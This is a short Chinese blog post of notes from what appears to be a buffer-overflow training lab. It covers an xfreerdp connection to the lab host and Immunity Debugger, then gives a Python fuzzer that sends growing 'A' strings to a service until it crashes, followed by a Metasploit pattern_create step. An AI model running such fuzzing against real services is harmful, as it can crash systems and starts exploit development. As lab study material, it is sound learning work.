[{"url":"/2021/07/27/溢出一/","content":"sudo apt install freerdp-x11\n\n缓冲区溢出一：\n\nxfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea\n\n\n\nxf_pre_connect: failed to open display: \nPlease check that the $DISPLAY environment variable is properly set.\n/build/freerdp-svb7gJ/freerdp-1.1.0~git20140921.1.440916e+dfsg1/libfreerdp/core/freerdp.c:86: freerdp_pre_connect failed\n\n\n\n`Immunity Debugger`图标并选择：以管理员身份运行\n\n`fuzzer.py`\n\n```\n#!/usr/bin/env python3\n\nimport socket, time, sys\n\nip = \"10.10.217.229\"\n\nport = 1337\ntimeout = 5\nprefix = \"OVERFLOW1 \"\n\nstring = prefix + \"A\" * 100\n\nwhile True:\n  try:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n      s.settimeout(timeout)\n      s.connect((ip, port))\n      s.recv(1024)\n      print(\"Fuzzing with {} bytes\".format(len(string) - len(prefix)))\n      s.send(bytes(string, \"latin-1\"))\n      s.recv(1024)\n  except:\n    print(\"Fuzzing crashed at {} bytes\".format(len(string) - len(prefix)))\n    sys.exit(0)\n  string += 100 * \"A\"\n  time.sleep(1)\n```\n\n\n\n模糊器将发送由 As 组成的越来越长的字符串。如果模糊器使用其中一个字符串使服务器崩溃，则模糊器应退出并显示错误消息。记下发送的最大字节数\n\nImmunity Debugger\n\n```\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 最大字节数+400\n```\n\n\n\n![image-20210723151251253](溢出一.assets/image-20210723151251253.png)"}]